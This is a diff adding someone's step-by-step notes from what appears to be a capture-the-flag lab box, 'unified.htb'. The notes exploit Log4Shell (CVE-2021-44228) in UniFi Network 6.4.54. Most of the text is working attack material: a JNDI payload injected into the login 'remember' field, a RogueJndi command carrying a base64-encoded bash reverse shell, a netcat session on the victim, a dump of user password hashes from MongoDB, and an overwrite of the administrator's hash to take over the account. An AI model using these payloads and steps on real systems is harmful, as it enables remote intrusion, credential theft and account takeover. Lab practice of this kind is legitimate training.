@@ -1,3 +1,711 @@
 1. This websites using "Unifi network 6.4.54" software into this and Identify the potential vulneraility called "CVE-2021-44228" and exploit with it.
 -----------------------------------------------------------------------------------------------------------------------------------------------------
-2.
+2. when I click login i have request like this
+POST /api/login HTTP/1.1
+
+Host: 10.129.124.112:8443
+
+Content-Length: 70
+
+Sec-Ch-Ua-Platform: "Linux"
+
+Accept-Language: en-US,en;q=0.9
+
+Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
+
+Content-Type: application/json; charset=utf-8
+
+Sec-Ch-Ua-Mobile: ?0
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
+
+Accept: */*
+
+Origin: https://10.129.124.112:8443
+
+Sec-Fetch-Site: same-origin
+
+Sec-Fetch-Mode: cors
+
+Sec-Fetch-Dest: empty
+
+Referer: https://10.129.124.112:8443/manage/account/login?redirect=%2Fmanage
+
+Accept-Encoding: gzip, deflate, br
+
+Priority: u=1, i
+
+Connection: keep-alive
+
+
+
+{"username":"admin","password":"admin","remember":false,"strict":true}
+
+==============================================================================================================
+3. The response I recived is like below
+HTTP/1.1 400 
+
+vary: Origin
+
+Access-Control-Allow-Origin: https://10.129.124.112:8443
+
+Access-Control-Allow-Credentials: true
+
+Access-Control-Expose-Headers: Access-Control-Allow-Origin,Access-Control-Allow-Credentials
+
+X-Frame-Options: DENY
+
+Content-Type: application/json;charset=UTF-8
+
+Content-Length: 57
+
+Date: Thu, 21 Aug 2025 10:36:22 GMT
+
+Connection: close
+
+
+
+{"meta":{"rc":"error","msg":"api.err.Invalid"},"data":[]}
+===========================================================================================
+4. I planned inject jdni injection into the remerber coloumn,
+And I crafted the payload "${jndi:ldap://{Tun0 IP Address}/whatever}" and I send it via request
+I listen the connection with 
+"sudo sudo tcpdump -i tun0 port 389"
+and I got some different results.
+'''tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+16:27:04.705916 IP 10.129.124.112.34428 > 10.10.16.20.ldap: Flags [S], seq 839444711, win 64240, options [mss 1385,sackOK,TS val 3570755596 ecr 0,nop,wscale 7], length 0
+16:27:04.707961 IP 10.10.16.20.ldap > 10.129.124.112.34428: Flags [R.], seq 0, ack 839444712, win 0, length 0
+''''
+=============================================================================================
+5. Then I install the thing mvn package run the reverse code execution listening there.
+java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjIwLzEzMzcgMD4mMQo=}|{base64,-d}|{bash,-i}" --hostname "10.10.16.20" 
++-+-+-+-+-+-+-+-+-+
+|R|o|g|u|e|J|n|d|i|
++-+-+-+-+-+-+-+-+-+
+Starting HTTP server on 0.0.0.0:8000
+Starting LDAP server on 0.0.0.0:1389
+Mapping ldap://10.10.16.20:1389/o=websphere1 to artsploit.controllers.WebSphere1
+Mapping ldap://10.10.16.20:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1
+Mapping ldap://10.10.16.20:1389/o=websphere2 to artsploit.controllers.WebSphere2
+Mapping ldap://10.10.16.20:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2
+Mapping ldap://10.10.16.20:1389/o=tomcat to artsploit.controllers.Tomcat
+Mapping ldap://10.10.16.20:1389/o=groovy to artsploit.controllers.Groovy
+Mapping ldap://10.10.16.20:1389/ to artsploit.controllers.RemoteReference
+Mapping ldap://10.10.16.20:1389/o=reference to artsploit.controllers.RemoteReference
+Sending LDAP ResourceRef result for o=tomcat with javax.el.ELProcessor payload
+then I past this map on my remeberme text 
+i run parallaly "nc -lvnp 1337" concurrently I recived the connection called 
+--------------------------------------------------------------------------------
+nc -lvnp 1337
+listening on [any] 1337 ...
+connect to [10.10.16.20] from (UNKNOWN) [10.129.124.112] 60738
+script /dev/null -c bash
+Script started, file is /dev/null
+unifi@unified:/usr/lib/unifi$ pyhton3 -c 'import pty;pty.spawn("/bin/bash")'
+pyhton3 -c 'import pty;pty.spawn("/bin/bash")'
+bash: pyhton3: command not found
+unifi@unified:/usr/lib/unifi$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+bash: python3: command not found
+unifi@unified:/usr/lib/unifi$ ls
+ls
+bin  data  dl  lib  logs  run  webapps  work
+unifi@unified:/usr/lib/unifi$ 
+-----------------------------------------------------------------------------
+i got the foothold from this then i go to priv esc part.
+I run the "ps aux | grep mongo"
+ps aux | grep mongo
+ps aux | grep mongo
+unifi         68  0.2  4.1 1103744 85280 ?       Sl   11:20   0:10 bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1
+unifi       1869  0.0  0.0  11468  1060 pts/0    S+   12:25   0:00 grep mongo
+------------------------------------------------------------------------------
+Then I run the command mongo default databses with like this 
+mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
+
+MongoDB shell version v3.6.3
+connecting to: mongodb://127.0.0.1:27117/ace
+MongoDB server version: 3.6.3
+{
+        "_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
+        "name" : "administrator",
+        "email" : "administrator@unified.htb",
+        "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
+        "time_created" : NumberLong(1640900495),
+        "last_site_name" : "default",
+        "ui_settings" : {
+                "neverCheckForUpdate" : true,
+                "statisticsPrefferedTZ" : "SITE",
+                "statisticsPreferBps" : "",
+                "tables" : {
+                        "device" : {
+                                "sortBy" : "type",
+                                "isAscending" : true,
+                                "initialColumns" : [
+                                        "type",
+                                        "deviceName",
+                                        "status",
+                                        "connection",
+                                        "network",
+                                        "ipAddress",
+                                        "experience",
+                                        "firmwareStatus",
+                                        "downlink",
+                                        "uplink",
+                                        "dailyUsage"
+                                ],
+                                "columns" : [
+                                        "type",
+                                        "deviceName",
+                                        "status",
+                                        "macAddress",
+                                        "model",
+                                        "ipAddress",
+                                        "connection",
+                                        "network",
+                                        "experience",
+                                        "firmwareStatus",
+                                        "firmwareVersion",
+                                        "memoryUsage",
+                                        "cpuUsage",
+                                        "loadAverage",
+                                        "utilization",
+                                        "clients",
+                                        "lastSeen",
+                                        "downlink",
+                                        "uplink",
+                                        "dailyUsage",
+                                        "uptime",
+                                        "wlan2g",
+                                        "wlan5g",
+                                        "radio2g",
+                                        "radio5g",
+                                        "clients2g",
+                                        "clients5g",
+                                        "bssid",
+                                        "tx",
+                                        "rx",
+                                        "tx2g",
+                                        "tx5g",
+                                        "channel",
+                                        "channel2g",
+                                        "channel5g"
+                                ]
+                        },
+                        "client" : {
+                                "sortBy" : "physicalName",
+                                "isAscending" : true,
+                                "initialColumns" : [
+                                        "status",
+                                        "clientName",
+                                        "physicalName",
+                                        "connection",
+                                        "ip",
+                                        "experience",
+                                        "Downlink",
+                                        "Uplink",
+                                        "dailyUsage"
+                                ],
+                                "columns" : [
+                                        "status",
+                                        "clientName",
+                                        "mac",
+                                        "physicalName",
+                                        "connection",
+                                        "network",
+                                        "interface",
+                                        "wifi_band",
+                                        "ip",
+                                        "experience",
+                                        "Downlink",
+                                        "Uplink",
+                                        "dailyUsage",
+                                        "uptime",
+                                        "channel",
+                                        "Uplink_apPort",
+                                        "signal",
+                                        "txRate",
+                                        "rxRate",
+                                        "first_seen",
+                                        "last_seen",
+                                        "rx_packets",
+                                        "tx_packets"
+                                ],
+                                "filters" : {
+                                        "status" : {
+                                                "active" : true
+                                        },
+                                        "connection_type" : {
+                                                "ng" : true,
+                                                "na" : true,
+                                                "wired" : true,
+                                                "vpn" : true
+                                        },
+                                        "clients_type" : {
+                                                "users" : true,
+                                                "guests" : true
+                                        },
+                                        "device" : {
+                                                "device" : ""
+                                        }
+                                }
+                        },
+                        "unifiDevice" : {
+                                "sortBy" : "type",
+                                "isAscending" : true,
+                                "columns" : [
+                                        "type",
+                                        "name",
+                                        "status",
+                                        "macAddress",
+                                        "model",
+                                        "ipAddress",
+                                        "connection",
+                                        "network",
+                                        "experience",
+                                        "firmwareStatus",
+                                        "firmwareVersion",
+                                        "memoryUsage",
+                                        "cpuUsage",
+                                        "loadAverage",
+                                        "utilization",
+                                        "clients",
+                                        "dailyUsage",
+                                        "lastSeen",
+                                        "downlink",
+                                        "uplink",
+                                        "uptime",
+                                        "wlan2g",
+                                        "wlan5g",
+                                        "radio2g",
+                                        "radio5g",
+                                        "clients2g",
+                                        "clients5g",
+                                        "bssid",
+                                        "tx",
+                                        "rx",
+                                        "tx2g",
+                                        "tx5g",
+                                        "channel",
+                                        "channel2g",
+                                        "channel5g"
+                                ],
+                                "initialColumns" : [
+                                        "type",
+                                        "name",
+                                        "status",
+                                        "connection",
+                                        "network",
+                                        "ipAddress",
+                                        "experience",
+                                        "firmwareStatus",
+                                        "downlink",
+                                        "uplink",
+                                        "dailyUsage"
+                                ]
+                        },
+                        "unifiDeviceNetwork" : {
+                                "sortBy" : "type",
+                                "isAscending" : true,
+                                "columns" : [
+                                        "type",
+                                        "name",
+                                        "status",
+                                        "macAddress",
+                                        "model",
+                                        "ipAddress",
+                                        "connection",
+                                        "network",
+                                        "experience",
+                                        "firmwareStatus",
+                                        "firmwareVersion",
+                                        "memoryUsage",
+                                        "cpuUsage",
+                                        "loadAverage",
+                                        "utilization",
+                                        "clients",
+                                        "dailyUsage",
+                                        "lastSeen",
+                                        "downlink",
+                                        "uplink",
+                                        "uptime",
+                                        "wlan2g",
+                                        "wlan5g",
+                                        "radio2g",
+                                        "radio5g",
+                                        "clients2g",
+                                        "clients5g",
+                                        "bssid",
+                                        "tx",
+                                        "rx",
+                                        "tx2g",
+                                        "tx5g",
+                                        "channel",
+                                        "channel2g",
+                                        "channel5g"
+                                ],
+                                "initialColumns" : [
+                                        "type",
+                                        "name",
+                                        "status",
+                                        "connection",
+                                        "network",
+                                        "ipAddress",
+                                        "experience",
+                                        "firmwareStatus",
+                                        "downlink",
+                                        "uplink",
+                                        "dailyUsage"
+                                ]
+                        },
+                        "unifiDeviceAccess" : {
+                                "sortBy" : "type",
+                                "isAscending" : true,
+                                "columns" : [
+                                        "type",
+                                        "name",
+                                        "status",
+                                        "macAddress",
+                                        "model",
+                                        "ipAddress",
+                                        "connection",
+                                        "network",
+                                        "experience",
+                                        "firmwareStatus",
+                                        "firmwareVersion",
+                                        "memoryUsage",
+                                        "cpuUsage",
+                                        "loadAverage",
+                                        "utilization",
+                                        "clients",
+                                        "dailyUsage",
+                                        "lastSeen",
+                                        "downlink",
+                                        "uplink",
+                                        "uptime",
+                                        "wlan2g",
+                                        "wlan5g",
+                                        "radio2g",
+                                        "radio5g",
+                                        "clients2g",
+                                        "clients5g",
+                                        "bssid",
+                                        "tx",
+                                        "rx",
+                                        "tx2g",
+                                        "tx5g",
+                                        "channel",
+                                        "channel2g",
+                                        "channel5g"
+                                ],
+                                "initialColumns" : [
+                                        "type",
+                                        "name",
+                                        "status",
+                                        "connection",
+                                        "network",
+                                        "ipAddress",
+                                        "experience",
+                                        "firmwareStatus",
+                                        "downlink",
+                                        "uplink",
+                                        "dailyUsage"
+                                ]
+                        },
+                        "unifiDeviceProtect" : {
+                                "sortBy" : "type",
+                                "isAscending" : true,
+                                "columns" : [
+                                        "type",
+                                        "name",
+                                        "status",
+                                        "macAddress",
+                                        "model",
+                                        "ipAddress",
+                                        "connection",
+                                        "network",
+                                        "experience",
+                                        "firmwareStatus",
+                                        "firmwareVersion",
+                                        "memoryUsage",
+                                        "cpuUsage",
+                                        "loadAverage",
+                                        "utilization",
+                                        "clients",
+                                        "dailyUsage",
+                                        "lastSeen",
+                                        "downlink",
+                                        "uplink",
+                                        "uptime",
+                                        "wlan2g",
+                                        "wlan5g",
+                                        "radio2g",
+                                        "radio5g",
+                                        "clients2g",
+                                        "clients5g",
+                                        "bssid",
+                                        "tx",
+                                        "rx",
+                                        "tx2g",
+                                        "tx5g",
+                                        "channel",
+                                        "channel2g",
+                                        "channel5g"
+                                ],
+                                "initialColumns" : [
+                                        "type",
+                                        "name",
+                                        "status",
+                                        "connection",
+                                        "network",
+                                        "ipAddress",
+                                        "experience",
+                                        "firmwareStatus",
+                                        "downlink",
+                                        "uplink",
+                                        "dailyUsage"
+                                ]
+                        },
+                        "unifiDeviceTalk" : {
+                                "sortBy" : "type",
+                                "isAscending" : true,
+                                "columns" : [
+                                        "type",
+                                        "name",
+                                        "status",
+                                        "macAddress",
+                                        "model",
+                                        "ipAddress",
+                                        "connection",
+                                        "network",
+                                        "experience",
+                                        "firmwareStatus",
+                                        "firmwareVersion",
+                                        "memoryUsage",
+                                        "cpuUsage",
+                                        "loadAverage",
+                                        "utilization",
+                                        "clients",
+                                        "dailyUsage",
+                                        "lastSeen",
+                                        "downlink",
+                                        "uplink",
+                                        "uptime",
+                                        "wlan2g",
+                                        "wlan5g",
+                                        "radio2g",
+                                        "radio5g",
+                                        "clients2g",
+                                        "clients5g",
+                                        "bssid",
+                                        "tx",
+                                        "rx",
+                                        "tx2g",
+                                        "tx5g",
+                                        "channel",
+                                        "channel2g",
+                                        "channel5g"
+                                ],
+                                "initialColumns" : [
+                                        "type",
+                                        "name",
+                                        "status",
+                                        "connection",
+                                        "network",
+                                        "ipAddress",
+                                        "experience",
+                                        "firmwareStatus",
+                                        "downlink",
+                                        "uplink",
+                                        "dailyUsage"
+                                ]
+                        },
+                        "insights/wifiScanner" : {
+                                "sortBy" : "apCount",
+                                "isAscending" : false,
+                                "initialColumns" : [
+                                        "apCount",
+                                        "essid",
+                                        "bssid",
+                                        "security",
+                                        "radio",
+                                        "signal",
+                                        "channel",
+                                        "band",
+                                        "bw",
+                                        "oui",
+                                        "date",
+                                        "ap_mac"
+                                ],
+                                "columns" : [
+                                        "apCount",
+                                        "essid",
+                                        "bssid",
+                                        "security",
+                                        "radio",
+                                        "signal",
+                                        "channel",
+                                        "band",
+                                        "bw",
+                                        "oui",
+                                        "date",
+                                        "ap_mac"
+                                ]
+                        },
+                        "insights/wifiMan" : {
+                                "sortBy" : "date",
+                                "isAscending" : false,
+                                "initialColumns" : [
+                                        "clinet_name",
+                                        "client_wifi_experience",
+                                        "device_model",
+                                        "device_name",
+                                        "wlan_essid",
+                                        "client_signal",
+                                        "wlan_channel_width",
+                                        "down",
+                                        "up",
+                                        "endPoint",
+                                        "rate",
+                                        "date"
+                                ],
+                                "columns" : [
+                                        "clinet_name",
+                                        "client_wifi_experience",
+                                        "device_model",
+                                        "device_name",
+                                        "wlan_essid",
+                                        "client_signal",
+                                        "wlan_channel_width",
+                                        "down",
+                                        "up",
+                                        "endPoint",
+                                        "rate",
+                                        "date"
+                                ]
+                        }
+                },
+                "topologyViewSettings" : {
+                        "showAllDevices" : true,
+                        "showAllClients" : true,
+                        "show2GClients" : true,
+                        "show5GClients" : true,
+                        "showWiredClients" : true,
+                        "showSSID" : false,
+                        "showWifiExperience" : true,
+                        "showRadioChannel" : false,
+                        "showWifiStandards" : false,
+                        "showWiredSpeed" : false,
+                        "showWiredPorts" : false,
+                        "online" : true,
+                        "offline" : true,
+                        "isolated" : true,
+                        "pending_adoption" : true,
+                        "managed_by_another_console" : true
+                },
+                "preferences" : {
+                        "alertsPosition" : "top_right",
+                        "allowHiddenDashboardModules" : false,
+                        "browserLogLevel" : "INFO",
+                        "bypassAutoFindDevices" : false,
+                        "bypassConfirmAdoptAndUpgrade" : false,
+                        "bypassConfirmBlock" : false,
+                        "bypassConfirmRestart" : false,
+                        "bypassConfirmUpgrade" : false,
+                        "bypassHybridDashboardNotice" : false,
+                        "bypassDashboardUdmProAd" : false,
+                        "bypassHybridSettingsNotice" : false,
+                        "dateFormat" : "MMM DD YYYY",
+                        "dismissWlanOverrides" : false,
+                        "enableNewUI" : false,
+                        "hideV3SettingsIntro" : true,
+                        "isAppDark" : true,
+                        "isPropertyPanelFixed" : true,
+                        "isRegularGraphForAirViewEnabled" : false,
+                        "isResponsive" : false,
+                        "isSettingsDark" : true,
+                        "isUndockedByDefault" : false,
+                        "noWhatsNew" : false,
+                        "propertyPanelCollapse" : false,
+                        "propertyPanelMultiMode" : true,
+                        "refreshButtonEnabled" : false,
+                        "refreshRate" : "2MIN",
+                        "refreshRateRememberAll" : false,
+                        "rowsPerPage" : 50,
+                        "showAllPanelActions" : false,
+                        "showWifimanAppsBanner" : true,
+                        "timeFormat" : "H:mm",
+                        "use24HourTime" : true,
+                        "useBrowserTheme" : false,
+                        "useSettingsPanelView" : false,
+                        "websocketEnabled" : true,
+                        "withStickyTableActions" : true,
+                        "isUlteModalClosed" : false,
+                        "isUbbAlignmentToolModalClosed" : false,
+                        "offlineClientTimeframe" : 24
+                },
+                "preferredLanguage" : "en",
+                "dashboardConfig" : {
+                        "lastActiveDashboardId" : "61ce269d46e0fb0012d47ec6"
+                }
+        },
+        "requires_new_password" : false,
+        "email_alert_enabled" : true,
+        "email_alert_grouping_enabled" : true,
+        "html_email_enabled" : true,
+        "is_professional_installer" : false,
+        "push_alert_enabled" : true
+}
+{
+        "_id" : ObjectId("61ce4a63fbce5e00116f424f"),
+        "email" : "michael@unified.htb",
+        "name" : "michael",
+        "x_shadow" : "$6$spHwHYVF$mF/VQrMNGSau0IP7LjqQMfF5VjZBph6VUf4clW3SULqBjDNQwW.BlIqsafYbLWmKRhfWTiZLjhSP.D/M1h5yJ0",
+        "requires_new_password" : false,
+        "time_created" : NumberLong(1640909411),
+        "last_site_name" : "default",
+        "email_alert_enabled" : false,
+        "email_alert_grouping_enabled" : false,
+        "email_alert_grouping_delay" : 60,
+        "push_alert_enabled" : false
+}
+{
+        "_id" : ObjectId("61ce4ce8fbce5e00116f4251"),
+        "email" : "seamus@unified.htb",
+        "name" : "Seamus",
+        "x_shadow" : "$6$NT.hcX..$aFei35dMy7Ddn.O.UFybjrAaRR5UfzzChhIeCs0lp1mmXhVHol6feKv4hj8LaGe0dTiyvq1tmA.j9.kfDP.xC.",
+        "requires_new_password" : true,
+        "time_created" : NumberLong(1640910056),
+        "last_site_name" : "default"
+}
+{
+        "_id" : ObjectId("61ce4d27fbce5e00116f4252"),
+        "email" : "warren@unified.htb",
+        "name" : "warren",
+        "x_shadow" : "$6$DDOzp/8g$VXE2i.FgQSRJvTu.8G4jtxhJ8gm22FuCoQbAhhyLFCMcwX95ybr4dCJR/Otas100PZA9fHWgTpWYzth5KcaCZ.",
+        "requires_new_password" : true,
+        "time_created" : NumberLong(1640910119),
+        "last_site_name" : "default"
+}
+{
+        "_id" : ObjectId("61ce4d51fbce5e00116f4253"),
+        "email" : "james@unfiied.htb",
+        "name" : "james",
+        "x_shadow" : "$6$ON/tM.23$cp3j11TkOCDVdy/DzOtpEbRC5mqbi1PPUM6N4ao3Bog8rO.ZGqn6Xysm3v0bKtyclltYmYvbXLhNybGyjvAey1",
+        "requires_new_password" : false,
+        "time_created" : NumberLong(1640910161),
+        "last_site_name" : "default"
+}
+==============================================================================================================
+From this i can understan we can alter the database assign a new password for admin
+mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$.MrbTE6Dq9S97sg9$wc67pRKuMlE1xDuRhDD.ajfviKm0eJ4286yhOcHbrJiVZDzJ8f8WDI25F9ZbeR/EtE4CZZsICgzB/eDbB4KoD0"}})' from
+this command we can altered the password.
+
+mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$.MrbTE6Dq9S97sg9$wc67pRKuMlE1xDuRhDD.ajfviKm0eJ4286yhOcHbrJiVZDzJ8f8WDI25F9ZbeR/EtE4CZZsICgzB/eDbB4KoD0"}})'
+DbB4KoD0"}})'1xDuRhDD.ajfviKm0eJ4286yhOcHbrJiVZDzJ8f8WDI25F9ZbeR/EtE4CZZsICgzB/eD
+MongoDB shell version v3.6.3
+connecting to: mongodb://127.0.0.1:27117/ace
+MongoDB server version: 3.6.3
+WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })
+-----------------------------------------------------------------------------------------------------------------
+After this I login to the webpage then i can easily identify the password and rooted the box.
